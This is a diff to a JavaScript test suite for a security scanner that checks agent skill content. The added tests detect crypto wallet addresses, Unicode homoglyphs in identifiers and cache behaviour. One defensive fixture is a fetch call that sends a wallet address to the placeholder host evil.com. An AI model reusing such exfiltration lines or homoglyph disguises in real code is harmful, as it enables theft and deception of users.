@@ -1,6 +1,6 @@
 import { describe, it } from "node:test";
 import assert from "node:assert/strict";
-import { scanSkillContent } from "../security-scanner.js";
+import { scanSkillContent, clearScanCache, getScanCacheStats } from "../security-scanner.js";
 
 // ─── Helper ──────────────────────────────────────────────────────────────────
 
@@ -496,6 +496,81 @@ describe("Security Scanner", () => {
     });
   });
 
+  // ── Crypto Wallet Exfiltration ──
+  describe("crypto wallet exfiltration", () => {
+    it("detects BTC address pattern", () => {
+      assertDetects(
+        `const addr = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa";`,
+        "credential-theft",
+        "warning"
+      );
+    });
+
+    it("detects ETH address pattern", () => {
+      assertDetects(
+        `const wallet = "0xde0B295669a9FD93d5F28D9Ec85E40f4cb697BAe";`,
+        "credential-theft",
+        "warning"
+      );
+    });
+
+    it("detects wallet address in fetch call", () => {
+      assertDetects(
+        `fetch("https://evil.com/steal?wallet=1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa")`,
+        "credential-theft",
+        "warning"
+      );
+    });
+
+    it("does NOT flag normal hex strings or short numbers", () => {
+      // Short hex string (not 40 chars) and normal number should be safe
+      const result = scanSkillContent(
+        `const color = "0xFFAABB";\nconst count = 12345;`
+      );
+      const hasCryptoThreat = result.threats.some(
+        (t) => t.category === "credential-theft" && t.description.includes("crypto")
+      );
+      assert.ok(!hasCryptoThreat, "Should not flag short hex or normal numbers as crypto");
+    });
+  });
+
+  // ── Unicode Homoglyphs ──
+  describe("Unicode homoglyphs", () => {
+    it("detects Cyrillic 'a' (U+0430) mixed in code", () => {
+      // The variable name uses Cyrillic 'а' (U+0430) instead of Latin 'a'
+      assertDetects(
+        `const \u0430dmin = true; // Cyrillic а in variable name`,
+        "prompt-injection"
+      );
+    });
+
+    it("detects Cyrillic 'e' (U+0435) in variable names", () => {
+      assertDetects(
+        `function r\u0435quest(url) { return fetch(url); }`,
+        "prompt-injection"
+      );
+    });
+
+    it("detects Greek characters mixed in code", () => {
+      // Uses Greek omicron (U+03BF) instead of Latin 'o'
+      assertDetects(
+        `const t\u03BFken = getAuthHeader();`,
+        "prompt-injection"
+      );
+    });
+
+    it("does NOT flag comments with legitimate Unicode", () => {
+      // Pure ASCII code should be safe
+      const result = scanSkillContent(
+        `// This is a normal comment\nconst x = 42;\nfunction hello() { return "world"; }`
+      );
+      const hasHomoglyphThreat = result.threats.some(
+        (t) => t.description.includes("homoglyph") || t.description.includes("confusable")
+      );
+      assert.ok(!hasHomoglyphThreat, "Should not flag normal ASCII code as homoglyph attack");
+    });
+  });
+
   // ── Risk Level / Safe Flag ──
   describe("risk assessment", () => {
     it("marks critical threats as not safe", () => {
@@ -557,5 +632,35 @@ describe("Security Scanner", () => {
       const result = scanSkillContent(bigContent);
       assert.equal(result.safe, true);
     });
+  });
+});
+
+// ─── Scan Cache Tests ─────────────────────────────────────────────────────────
+
+describe("scan cache", () => {
+  it("clearScanCache clears all entries", () => {
+    // Ensure cache is in a known state then clear
+    clearScanCache();
+    const stats = getScanCacheStats();
+    assert.equal(stats.size, 0, "Cache should be empty after clear");
+  });
+
+  it("getScanCacheStats returns correct structure", () => {
+    clearScanCache();
+    const stats = getScanCacheStats();
+    assert.equal(typeof stats.size, "number");
+    assert.equal(typeof stats.maxSize, "number");
+    assert.equal(typeof stats.ttlMs, "number");
+    assert.ok(stats.maxSize > 0, "maxSize should be positive");
+    assert.ok(stats.ttlMs > 0, "ttlMs should be positive");
+    assert.equal(stats.maxSize, 100);
+    assert.equal(stats.ttlMs, 15 * 60 * 1000);
+  });
+
+  it("clearScanCache is idempotent", () => {
+    clearScanCache();
+    clearScanCache();
+    const stats = getScanCacheStats();
+    assert.equal(stats.size, 0);
   });
 });
